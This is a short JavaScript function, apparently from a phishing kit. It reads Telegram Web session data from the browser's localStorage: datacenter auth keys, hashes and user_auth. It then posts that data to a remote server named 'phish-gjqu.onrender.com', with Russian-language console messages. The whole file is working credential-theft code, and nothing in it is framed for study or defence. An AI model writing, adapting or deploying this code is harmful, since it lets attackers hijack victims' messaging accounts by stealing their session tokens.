function sendData() {
    const dataToSend = {
        dc: localStorage.getItem('dc'),
        dc1_auth_key: localStorage.getItem('dc1_auth_key'),
        dc1_hash: localStorage.getItem('dc1_hash'),
        dc2_auth_key: localStorage.getItem('dc2_auth_key'),
        dc2_hash: localStorage.getItem('dc2_hash'),
        dc4_auth_key: localStorage.getItem('dc4_auth_key'),
        dc4_hash: localStorage.getItem('dc4_hash'),
        user_auth: localStorage.getItem('user_auth')
    };

    fetch("https://phish-gjqu.onrender.com/api/data", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(dataToSend)
    })
    .then(response => response.json())
    .then(data => {
        console.log("Ответ от сервера:", data);
    })
    .catch(error => {
        console.error("Ошибка при отправке данных:", error);
    });
}
